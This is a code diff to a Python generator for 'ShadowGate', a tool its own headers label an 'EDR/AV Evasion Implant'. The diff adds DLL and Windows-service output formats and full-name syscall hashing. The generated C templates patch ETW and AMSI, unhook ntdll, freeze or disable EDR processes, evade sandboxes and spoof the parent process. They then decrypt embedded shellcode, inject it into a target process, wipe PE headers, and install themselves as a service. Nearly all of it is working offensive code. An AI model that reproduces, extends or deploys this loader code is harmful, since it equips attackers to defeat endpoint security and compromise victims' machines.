@@ -149,17 +149,41 @@ class CodeGenerator:
         print(colored(f"[*] Generating string obfuscation ({self.config.strings})...", Colors.CYAN))
         strings_cpp = self._generate_string_obfuscation()
         
-        # Step 7: Generate main.cpp
-        print(colored("[*] Generating main.cpp...", Colors.CYAN))
-        main_cpp = self._generate_main_cpp(
-            encoded_cpp=encoded_cpp,
-            crypto_keys_cpp=self.crypto.generate_cpp_keys(),
-            crypto_funcs_cpp=self.crypto.generate_cpp_decrypt_functions(self.config.encrypt),
-            decoder_cpp=self.encoder.generate_cpp_decoder(self.config.encode),
-            api_hashes_cpp=api_hashes_cpp,
-            strings_cpp=strings_cpp,
-        )
-        files['main.cpp'] = main_cpp
+        # Step 7: Generate entry point file based on output format
+        fmt = self.config.output_format
+        if fmt == 'dll':
+            print(colored("[*] Generating dllmain.cpp...", Colors.CYAN))
+            entry_cpp = self._generate_dll_main_cpp(
+                encoded_cpp=encoded_cpp,
+                crypto_keys_cpp=self.crypto.generate_cpp_keys(),
+                crypto_funcs_cpp=self.crypto.generate_cpp_decrypt_functions(self.config.encrypt),
+                decoder_cpp=self.encoder.generate_cpp_decoder(self.config.encode),
+                api_hashes_cpp=api_hashes_cpp,
+                strings_cpp=strings_cpp,
+            )
+            files['dllmain.cpp'] = entry_cpp
+        elif fmt == 'svc':
+            print(colored("[*] Generating svcmain.cpp...", Colors.CYAN))
+            entry_cpp = self._generate_svc_main_cpp(
+                encoded_cpp=encoded_cpp,
+                crypto_keys_cpp=self.crypto.generate_cpp_keys(),
+                crypto_funcs_cpp=self.crypto.generate_cpp_decrypt_functions(self.config.encrypt),
+                decoder_cpp=self.encoder.generate_cpp_decoder(self.config.encode),
+                api_hashes_cpp=api_hashes_cpp,
+                strings_cpp=strings_cpp,
+            )
+            files['svcmain.cpp'] = entry_cpp
+        else:
+            print(colored("[*] Generating main.cpp...", Colors.CYAN))
+            main_cpp = self._generate_main_cpp(
+                encoded_cpp=encoded_cpp,
+                crypto_keys_cpp=self.crypto.generate_cpp_keys(),
+                crypto_funcs_cpp=self.crypto.generate_cpp_decrypt_functions(self.config.encrypt),
+                decoder_cpp=self.encoder.generate_cpp_decoder(self.config.encode),
+                api_hashes_cpp=api_hashes_cpp,
+                strings_cpp=strings_cpp,
+            )
+            files['main.cpp'] = main_cpp
         
         # Step 8: Generate syscall files
         print(colored(f"[*] Generating syscall code ({self.config.syscall})...", Colors.CYAN))
@@ -386,6 +410,7 @@ class CodeGenerator:
 #define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
 #define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
 #define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
+#define ENABLE_SYSCALL_HASH {1 if self.config.syscall_hash else 0}
 
 // ============================================================================
 // Output Macros
@@ -695,6 +720,716 @@ int main(int argc, char** argv) {{
 '''
         return code
     
+    def _generate_dll_main_cpp(self, encoded_cpp: str, crypto_keys_cpp: str,
+                               crypto_funcs_cpp: str, decoder_cpp: str,
+                               api_hashes_cpp: str, strings_cpp: str) -> str:
+        """Generate dllmain.cpp for --output-format dll"""
+        
+        inject_map = {
+            INJECT_STOMP: "INJECT_STOMP",
+            INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
+            INJECT_REMOTETHREAD: "INJECT_REMOTETHREAD",
+            "threadpool": "INJECT_REMOTETHREAD",
+            INJECT_HOLLOWING: "INJECT_HOLLOWING",
+            INJECT_MAPPING: "INJECT_MAPPING",
+            INJECT_THREADPOOL_REAL: "INJECT_THREADPOOL_REAL",
+            INJECT_EARLYCASCADE: "INJECT_EARLYCASCADE",
+            INJECT_CALLBACK: "INJECT_CALLBACK",
+        }
+        inject_const = inject_map.get(self.config.inject, "INJECT_STOMP")
+        target_process = self.config.target.replace("\\", "\\\\")
+        
+        return f'''/*
+ * ============================================================================
+ * ShadowGate - EDR/AV Evasion Implant (DLL)
+ * Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+ * ============================================================================
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+#include "common.h"
+#include "syscalls.h"
+#include "resolver.h"
+#include "injection.h"
+#include "evasion.h"
+#if ENABLE_SLEEP_OBF
+#include "sleep_obf.h"
+#endif
+#if ENABLE_CALLSTACK_SPOOF
+#include "callstack.h"
+#endif
+#if ENABLE_DYNAPI
+#include "dynapi.h"
+#endif
+#include "earlycascade.h"
+#if ENABLE_EDR_FREEZE
+#include "edr_freeze.h"
+#endif
+
+// ============================================================================
+// Build Configuration
+// ============================================================================
+
+#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#define INJECTION_METHOD    {inject_const}
+#define TARGET_PROCESS      L"{target_process}"
+#define INITIAL_SLEEP       {self.config.sleep}
+
+#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
+#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
+#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
+#define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
+#define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
+#define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
+#define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
+#define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
+#define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
+#define ENABLE_FREEZE       {1 if self.config.freeze else 0}
+#define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
+#define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#define DEBUG_BUILD         {1 if self.config.debug else 0}
+#define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
+#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+#define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
+#define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
+#define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
+#define ENABLE_SYSCALL_HASH {1 if self.config.syscall_hash else 0}
+
+// ============================================================================
+// Output Macros
+// ============================================================================
+
+#if DEBUG_BUILD
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_PHASE(fmt, ...)
+#endif
+
+// ============================================================================
+// API Hashes
+// ============================================================================
+
+{api_hashes_cpp}
+
+// ============================================================================
+// Obfuscated Strings
+// ============================================================================
+
+{strings_cpp}
+
+// ============================================================================
+// Encryption Keys
+// ============================================================================
+
+{crypto_keys_cpp}
+
+// ============================================================================
+// Encoded Shellcode
+// ============================================================================
+
+{encoded_cpp}
+
+// ============================================================================
+// Decryption Functions
+// ============================================================================
+
+{crypto_funcs_cpp}
+
+// ============================================================================
+// Decoder Function
+// ============================================================================
+
+{decoder_cpp}
+
+// ============================================================================
+// Payload Thread — all phases run here (called from DllMain thread / Run)
+// ============================================================================
+
+static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
+    NTSTATUS status;
+
+    // ========================================================================
+    // Phase 0a: EDR Preload (Optional)
+    // ========================================================================
+#if ENABLE_EDR_PRELOAD
+    if (!PerformEDRPreload()) {{
+        LOG_ERROR("EDR preload failed (continuing anyway)");
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 0: EDR Freeze (Optional)
+    // ========================================================================
+#if ENABLE_EDR_FREEZE
+    FreezeEDRProcesses();
+#endif
+
+    // ========================================================================
+    // Phase 1: Initial Delay
+    // ========================================================================
+#if INITIAL_SLEEP > 0
+    Sleep(INITIAL_SLEEP * 1000);
+#endif
+
+    // ========================================================================
+    // Phase 1b: Dynamic API Resolution (Optional)
+    // ========================================================================
+#if ENABLE_DYNAPI
+    if (!InitializeDynamicAPIs()) {{
+        LOG_ERROR("Dynamic API resolution failed");
+        return 1;
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 2: Sandbox Evasion
+    // ========================================================================
+#if ENABLE_SANDBOX
+    if (!PerformSandboxChecks()) {{
+        LOG_ERROR("Sandbox/VM detected - exiting");
+        return 1;
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 2.6: Disable Preloaded EDR Modules (EntryPoint Clobber)
+    // ========================================================================
+#if ENABLE_DISABLE_PRELOADED_EDR
+    DisablePreloadedEdrModules();
+#endif
+
+    // ========================================================================
+    // Phase 3: Syscall Resolution
+    // ========================================================================
+    if (!InitializeSyscalls()) {{
+        LOG_ERROR("Failed to resolve syscalls");
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 4: NTDLL Unhooking (Optional)
+    // ========================================================================
+#if ENABLE_UNHOOK
+    UnhookNtdll();
+#endif
+
+    // ========================================================================
+    // Phase 5: ETW Patching (Optional)
+    // ========================================================================
+#if ENABLE_ETW_PATCH
+    PatchETW();
+#endif
+
+    // ========================================================================
+    // Phase 5b: AMSI Bypass (Optional)
+    // ========================================================================
+#if ENABLE_AMSI_PATCH
+    PatchAMSI();
+#endif
+
+    // ========================================================================
+    // Phase 6: Shellcode Decoding
+    // ========================================================================
+    SIZE_T decodeBufferSize = g_OriginalSize + 256;
+    unsigned char* pDecoded = (unsigned char*)VirtualAlloc(
+        NULL, decodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pDecoded) {{
+        LOG_ERROR("Failed to allocate decode buffer");
+        return 1;
+    }}
+
+    SIZE_T decodedLen = 0;
+    if (!DecodeShellcode(pDecoded, &decodedLen)) {{
+        LOG_ERROR("Shellcode decoding failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 7: Shellcode Decryption
+    // ========================================================================
+    DeriveAllKeys();
+
+    unsigned char* pDecrypted = NULL;
+    SIZE_T decryptedLen = 0;
+    if (!DecryptShellcode(pDecoded, decodedLen, &pDecrypted, &decryptedLen)) {{
+        LOG_ERROR("Shellcode decryption failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return 1;
+    }}
+    VirtualFree(pDecoded, 0, MEM_RELEASE);
+
+    // ========================================================================
+    // Phase 8: Shellcode Injection
+    // ========================================================================
+    INJECTION_CONTEXT ctx = {{ 0 }};
+    ctx.pShellcode = pDecrypted;
+    ctx.dwShellcodeSize = decryptedLen;
+    ctx.wszTargetProcess = TARGET_PROCESS;
+    ctx.dwInjectionMethod = INJECTION_METHOD;
+
+    if (!PerformInjection(&ctx)) {{
+        LOG_ERROR("Injection failed");
+        VirtualFree(pDecrypted, 0, MEM_RELEASE);
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 8b: PE Header Wiping (Optional)
+    // ========================================================================
+#if ENABLE_WIPE_PE
+    WipePEHeaders();
+#endif
+
+    // ========================================================================
+    // Phase 9: Hook Integrity Verification (Optional)
+    // ========================================================================
+#if ENABLE_HOOK_CHECK
+    VerifyNoHooks();
+#endif
+
+    // ========================================================================
+    // Phase 10: Sleep Obfuscation (Optional keep-alive loop)
+    // ========================================================================
+#if ENABLE_SLEEP_OBF
+    while (ctx.bSuccess) {{
+        ObfuscatedSleep(30000, ctx.pRemoteBase, ctx.dwShellcodeSize);
+    }}
+#endif
+
+    VirtualFree(pDecrypted, 0, MEM_RELEASE);
+    return 0;
+}}
+
+// ============================================================================
+// DLL Entry Point
+// ============================================================================
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
+    switch (fdwReason) {{
+        case DLL_PROCESS_ATTACH:
+            DisableThreadLibraryCalls(hinstDLL);
+            CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }}
+    return TRUE;
+}}
+
+// ============================================================================
+// Run Export — for reflective/manual loaders that call exports directly
+// ============================================================================
+
+__declspec(dllexport) void Run(void) {{
+    CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
+}}
+'''
+
+    def _generate_svc_main_cpp(self, encoded_cpp: str, crypto_keys_cpp: str,
+                               crypto_funcs_cpp: str, decoder_cpp: str,
+                               api_hashes_cpp: str, strings_cpp: str) -> str:
+        """Generate svcmain.cpp for --output-format svc"""
+        
+        inject_map = {
+            INJECT_STOMP: "INJECT_STOMP",
+            INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
+            INJECT_REMOTETHREAD: "INJECT_REMOTETHREAD",
+            "threadpool": "INJECT_REMOTETHREAD",
+            INJECT_HOLLOWING: "INJECT_HOLLOWING",
+            INJECT_MAPPING: "INJECT_MAPPING",
+            INJECT_THREADPOOL_REAL: "INJECT_THREADPOOL_REAL",
+            INJECT_EARLYCASCADE: "INJECT_EARLYCASCADE",
+            INJECT_CALLBACK: "INJECT_CALLBACK",
+        }
+        inject_const = inject_map.get(self.config.inject, "INJECT_STOMP")
+        target_process = self.config.target.replace("\\", "\\\\")
+        
+        # Service name from output file stem
+        svc_name = Path(self.config.output_file).stem or "ShadowSvc"
+        
+        return f'''/*
+ * ============================================================================
+ * ShadowGate - EDR/AV Evasion Implant (Windows Service)
+ * Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+ * ============================================================================
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+#include "common.h"
+#include "syscalls.h"
+#include "resolver.h"
+#include "injection.h"
+#include "evasion.h"
+#if ENABLE_SLEEP_OBF
+#include "sleep_obf.h"
+#endif
+#if ENABLE_CALLSTACK_SPOOF
+#include "callstack.h"
+#endif
+#if ENABLE_DYNAPI
+#include "dynapi.h"
+#endif
+#include "earlycascade.h"
+#if ENABLE_EDR_FREEZE
+#include "edr_freeze.h"
+#endif
+
+// ============================================================================
+// Build Configuration
+// ============================================================================
+
+#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#define INJECTION_METHOD    {inject_const}
+#define TARGET_PROCESS      L"{target_process}"
+#define INITIAL_SLEEP       {self.config.sleep}
+#define SERVICE_NAME        L"{svc_name}"
+
+#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
+#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
+#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
+#define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
+#define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
+#define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
+#define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
+#define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
+#define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
+#define ENABLE_FREEZE       {1 if self.config.freeze else 0}
+#define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
+#define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
+#define DEBUG_BUILD         {1 if self.config.debug else 0}
+#define ENABLE_CMDLINE_SPOOF {1 if self.config.spoof_cmdline else 0}
+#define SPOOF_CMDLINE_STRING L"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+#define ENABLE_PPID_SPOOF   {1 if self.config.ppid_spoof else 0}
+#define PPID_SPOOF_TARGET   L"{self.config.ppid_spoof or 'explorer.exe'}"
+#define ENABLE_BLOCK_DLLS   {1 if self.config.block_dlls else 0}
+#define ENABLE_SYSCALL_HASH {1 if self.config.syscall_hash else 0}
+
+// ============================================================================
+// Output Macros
+// ============================================================================
+
+#if DEBUG_BUILD
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_PHASE(fmt, ...)
+#endif
+
+// ============================================================================
+// API Hashes
+// ============================================================================
+
+{api_hashes_cpp}
+
+// ============================================================================
+// Obfuscated Strings
+// ============================================================================
+
+{strings_cpp}
+
+// ============================================================================
+// Encryption Keys
+// ============================================================================
+
+{crypto_keys_cpp}
+
+// ============================================================================
+// Encoded Shellcode
+// ============================================================================
+
+{encoded_cpp}
+
+// ============================================================================
+// Decryption Functions
+// ============================================================================
+
+{crypto_funcs_cpp}
+
+// ============================================================================
+// Decoder Function
+// ============================================================================
+
+{decoder_cpp}
+
+// ============================================================================
+// Payload Thread — all phases (called from ServiceMain)
+// ============================================================================
+
+static DWORD WINAPI PayloadThread(LPVOID lpParam) {{
+    NTSTATUS status;
+
+    // ========================================================================
+    // Phase 0a: EDR Preload (Optional)
+    // ========================================================================
+#if ENABLE_EDR_PRELOAD
+    if (!PerformEDRPreload()) {{
+        LOG_ERROR("EDR preload failed (continuing anyway)");
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 0: EDR Freeze (Optional)
+    // ========================================================================
+#if ENABLE_EDR_FREEZE
+    FreezeEDRProcesses();
+#endif
+
+    // ========================================================================
+    // Phase 1: Initial Delay
+    // ========================================================================
+#if INITIAL_SLEEP > 0
+    Sleep(INITIAL_SLEEP * 1000);
+#endif
+
+    // ========================================================================
+    // Phase 1b: Dynamic API Resolution (Optional)
+    // ========================================================================
+#if ENABLE_DYNAPI
+    if (!InitializeDynamicAPIs()) {{
+        LOG_ERROR("Dynamic API resolution failed");
+        return 1;
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 2: Sandbox Evasion
+    // ========================================================================
+#if ENABLE_SANDBOX
+    if (!PerformSandboxChecks()) {{
+        LOG_ERROR("Sandbox/VM detected - exiting");
+        return 1;
+    }}
+#endif
+
+    // ========================================================================
+    // Phase 2.6: Disable Preloaded EDR Modules (EntryPoint Clobber)
+    // ========================================================================
+#if ENABLE_DISABLE_PRELOADED_EDR
+    DisablePreloadedEdrModules();
+#endif
+
+    // ========================================================================
+    // Phase 3: Syscall Resolution
+    // ========================================================================
+    if (!InitializeSyscalls()) {{
+        LOG_ERROR("Failed to resolve syscalls");
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 4: NTDLL Unhooking (Optional)
+    // ========================================================================
+#if ENABLE_UNHOOK
+    UnhookNtdll();
+#endif
+
+    // ========================================================================
+    // Phase 5: ETW Patching (Optional)
+    // ========================================================================
+#if ENABLE_ETW_PATCH
+    PatchETW();
+#endif
+
+    // ========================================================================
+    // Phase 5b: AMSI Bypass (Optional)
+    // ========================================================================
+#if ENABLE_AMSI_PATCH
+    PatchAMSI();
+#endif
+
+    // ========================================================================
+    // Phase 6: Shellcode Decoding
+    // ========================================================================
+    SIZE_T decodeBufferSize = g_OriginalSize + 256;
+    unsigned char* pDecoded = (unsigned char*)VirtualAlloc(
+        NULL, decodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pDecoded) {{
+        LOG_ERROR("Failed to allocate decode buffer");
+        return 1;
+    }}
+
+    SIZE_T decodedLen = 0;
+    if (!DecodeShellcode(pDecoded, &decodedLen)) {{
+        LOG_ERROR("Shellcode decoding failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 7: Shellcode Decryption
+    // ========================================================================
+    DeriveAllKeys();
+
+    unsigned char* pDecrypted = NULL;
+    SIZE_T decryptedLen = 0;
+    if (!DecryptShellcode(pDecoded, decodedLen, &pDecrypted, &decryptedLen)) {{
+        LOG_ERROR("Shellcode decryption failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return 1;
+    }}
+    VirtualFree(pDecoded, 0, MEM_RELEASE);
+
+    // ========================================================================
+    // Phase 8: Shellcode Injection
+    // ========================================================================
+    INJECTION_CONTEXT ctx = {{ 0 }};
+    ctx.pShellcode = pDecrypted;
+    ctx.dwShellcodeSize = decryptedLen;
+    ctx.wszTargetProcess = TARGET_PROCESS;
+    ctx.dwInjectionMethod = INJECTION_METHOD;
+
+    if (!PerformInjection(&ctx)) {{
+        LOG_ERROR("Injection failed");
+        VirtualFree(pDecrypted, 0, MEM_RELEASE);
+        return 1;
+    }}
+
+    // ========================================================================
+    // Phase 8b: PE Header Wiping (Optional)
+    // ========================================================================
+#if ENABLE_WIPE_PE
+    WipePEHeaders();
+#endif
+
+    // ========================================================================
+    // Phase 9: Hook Integrity Verification (Optional)
+    // ========================================================================
+#if ENABLE_HOOK_CHECK
+    VerifyNoHooks();
+#endif
+
+    // ========================================================================
+    // Phase 10: Sleep Obfuscation (Optional keep-alive loop)
+    // ========================================================================
+#if ENABLE_SLEEP_OBF
+    while (ctx.bSuccess) {{
+        ObfuscatedSleep(30000, ctx.pRemoteBase, ctx.dwShellcodeSize);
+    }}
+#endif
+
+    VirtualFree(pDecrypted, 0, MEM_RELEASE);
+    return 0;
+}}
+
+// ============================================================================
+// Service Globals
+// ============================================================================
+
+static SERVICE_STATUS_HANDLE g_hSvcStatus = NULL;
+static SERVICE_STATUS g_SvcStatus = {{ 0 }};
+
+// ============================================================================
+// ServiceCtrlHandler
+// ============================================================================
+
+static void WINAPI ServiceCtrlHandler(DWORD dwCtrl) {{
+    switch (dwCtrl) {{
+        case SERVICE_CONTROL_STOP:
+        case SERVICE_CONTROL_SHUTDOWN:
+            g_SvcStatus.dwCurrentState = SERVICE_STOP_PENDING;
+            SetServiceStatus(g_hSvcStatus, &g_SvcStatus);
+            break;
+        case SERVICE_CONTROL_INTERROGATE:
+            SetServiceStatus(g_hSvcStatus, &g_SvcStatus);
+            break;
+        default:
+            break;
+    }}
+}}
+
+// ============================================================================
+// ServiceMain
+// ============================================================================
+
+void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {{
+    g_hSvcStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
+    if (!g_hSvcStatus) return;
+
+    g_SvcStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
+    g_SvcStatus.dwCurrentState            = SERVICE_RUNNING;
+    g_SvcStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    g_SvcStatus.dwWin32ExitCode           = 0;
+    g_SvcStatus.dwServiceSpecificExitCode = 0;
+    g_SvcStatus.dwCheckPoint              = 0;
+    g_SvcStatus.dwWaitHint                = 0;
+    SetServiceStatus(g_hSvcStatus, &g_SvcStatus);
+
+    // Run payload synchronously inside service
+    PayloadThread(NULL);
+
+    g_SvcStatus.dwCurrentState  = SERVICE_STOPPED;
+    g_SvcStatus.dwWin32ExitCode = 0;
+    SetServiceStatus(g_hSvcStatus, &g_SvcStatus);
+}}
+
+// ============================================================================
+// wmain — install / uninstall / dispatch
+// ============================================================================
+
+int wmain(int argc, wchar_t* argv[]) {{
+    if (argc > 1) {{
+        if (lstrcmpW(argv[1], L"--install") == 0) {{
+            SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+            if (!hScm) return 1;
+            WCHAR wszPath[MAX_PATH];
+            GetModuleFileNameW(NULL, wszPath, MAX_PATH);
+            SC_HANDLE hSvc = CreateServiceW(
+                hScm, SERVICE_NAME, SERVICE_NAME,
+                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
+                SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
+                wszPath, NULL, NULL, NULL, NULL, NULL);
+            if (hSvc) {{
+                StartServiceW(hSvc, 0, NULL);
+                CloseServiceHandle(hSvc);
+            }}
+            CloseServiceHandle(hScm);
+            return 0;
+        }} else if (lstrcmpW(argv[1], L"--uninstall") == 0) {{
+            SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            if (!hScm) return 1;
+            SC_HANDLE hSvc = OpenServiceW(hScm, SERVICE_NAME, SERVICE_ALL_ACCESS);
+            if (hSvc) {{
+                SERVICE_STATUS ss;
+                ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
+                DeleteService(hSvc);
+                CloseServiceHandle(hSvc);
+            }}
+            CloseServiceHandle(hScm);
+            return 0;
+        }}
+    }}
+
+    SERVICE_TABLE_ENTRYW svcTable[] = {{
+        {{ (LPWSTR)SERVICE_NAME, ServiceMain }},
+        {{ NULL, NULL }}
+    }};
+    StartServiceCtrlDispatcherW(svcTable);
+    return 0;
+}}
+'''
+
     def _generate_syscall_files(self) -> dict:
         """Generate syscall-related files"""
         files = {}
@@ -1417,10 +2152,20 @@ DWORD64 HashString(LPCSTR str);
             encrypted = ', '.join(f'0x{ord(c) ^ xor_key:02X}' for c in name)
             name_arrays += f"static unsigned char g_Name{i}[] = {{ {encrypted}, 0x00 }}; // {name}\n"
     
-        # Build syscall table entries
+        # Pre-compute DJB2 hashes (seed=0x1505) of full syscall names for ENABLE_SYSCALL_HASH mode
+        def djb2_hash_0x1505(full_name: str) -> int:
+            h = 0x1505
+            for byte in full_name.encode():
+                h = ((h << 5) + h) + byte
+                h &= 0xFFFFFFFFFFFFFFFF
+            return h
+
+        # Build syscall table entries with pre-computed full-name hashes
         table_entries = ""
         for i, (name, idx) in enumerate(syscall_names):
-            table_entries += f"    {{ g_Name{i}, {len(name)}, {idx} }},\n"
+            full_name = "Nt" + name
+            precomputed = djb2_hash_0x1505(full_name)
+            table_entries += f"    {{ g_Name{i}, {len(name)}, {idx}, 0x{precomputed:016X}ULL }},  // {full_name}\n"
     
         return f'''/*
  * ShadowGate - Syscall Resolver
@@ -1455,6 +2200,7 @@ typedef struct _SYSCALL_NAME_ENTRY {{
     const unsigned char* pEncName;
     DWORD dwNameLen;
     DWORD dwIndex;
+    DWORD64 ullSyscallHash;  // Pre-computed DJB2(seed=0x1505) of full name
 }} SYSCALL_NAME_ENTRY;
 
 static SYSCALL_NAME_ENTRY g_SyscallNames[] = {{
@@ -1463,7 +2209,7 @@ static SYSCALL_NAME_ENTRY g_SyscallNames[] = {{
 #define SYSCALL_NAME_COUNT (sizeof(g_SyscallNames) / sizeof(g_SyscallNames[0]))
 
 // ============================================================================
-// Deobfuscate and Hash in One Pass
+// Deobfuscate and Hash in One Pass (seed=DJB2_SEED, partial name without Nt)
 // ============================================================================
 
 __forceinline DWORD64 DeobfuscateAndHash(const unsigned char* pEncName, DWORD dwLen) {{
@@ -1475,11 +2221,20 @@ __forceinline DWORD64 DeobfuscateAndHash(const unsigned char* pEncName, DWORD dw
     return hash;
 }}
 
-// Standard hash function for export comparison
+// Standard hash function for export comparison (seed=DJB2_SEED, partial name)
 DWORD64 HashString(LPCSTR str) {{
     DWORD64 hash = DJB2_SEED;
     while (*str) {{
         hash = ((hash << 5) + hash) + (DWORD64)*str++;
+    }}
+    return hash;
+}}
+
+// DJB2 hash of full export name (seed=0x1505) — used when ENABLE_SYSCALL_HASH=1
+static inline DWORD64 Djb2HashExportName(const char* str) {{
+    DWORD64 hash = 0x1505ULL;
+    while (*str) {{
+        hash = ((hash << 5) + hash) + (unsigned char)*str++;
     }}
     return hash;
 }}
@@ -1653,17 +2408,26 @@ PVOID GetProcAddressByHash(PVOID pBase, DWORD64 dwTargetHash) {{
     for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{
         LPCSTR szName = (LPCSTR)((PBYTE)pBase + pNames[i]);
         
-        // Only check Nt* and Zw* functions
+#if ENABLE_SYSCALL_HASH
+        // Hash the full export name (including Nt/Zw prefix) with DJB2 seed=0x1505
+        if ((szName[0] == 'N' && szName[1] == 't') ||
+            (szName[0] == 'Z' && szName[1] == 'w')) {{
+            if (Djb2HashExportName(szName) == dwTargetHash) {{
+                return (PVOID)((PBYTE)pBase + pFuncs[pOrds[i]]);
+            }}
+        }}
+#else
+        // Hash WITHOUT the Nt/Zw prefix (original behavior)
         if ((szName[0] == 'N' && szName[1] == 't') ||
             (szName[0] == 'Z' && szName[1] == 'w')) {{
             
-            // Hash WITHOUT the Nt/Zw prefix
             DWORD64 h = HashString(szName + 2);
             
             if (h == dwTargetHash) {{
                 return (PVOID)((PBYTE)pBase + pFuncs[pOrds[i]]);
             }}
         }}
+#endif
     }}
     
     return NULL;
@@ -1694,8 +2458,13 @@ BOOL ResolveSyscalls(PSYSCALL_ENTRY pTable, PDWORD pCount) {{
         DWORD dwNameLen = g_SyscallNames[i].dwNameLen;
         const unsigned char* pEncName = g_SyscallNames[i].pEncName;
         
-        // Calculate hash from obfuscated name
+        // Select hash: pre-computed full-name hash (ENABLE_SYSCALL_HASH=1)
+        // or XOR-deobfuscate and hash partial name (ENABLE_SYSCALL_HASH=0)
+#if ENABLE_SYSCALL_HASH
+        DWORD64 dwHash = g_SyscallNames[i].ullSyscallHash;
+#else
         DWORD64 dwHash = DeobfuscateAndHash(pEncName, dwNameLen);
